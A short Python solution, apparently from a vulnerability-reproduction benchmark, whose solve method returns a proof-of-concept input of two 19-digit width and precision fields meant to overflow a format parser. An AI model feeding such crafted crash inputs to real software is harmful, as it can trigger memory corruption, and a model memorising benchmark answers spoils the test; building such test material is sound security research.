class Solution:
    def solve(self, src_path: str) -> bytes:
        width = b'1' * 19
        prec = b'1' * 19
        poc = width + b' ' + prec + b'\n'
        return poc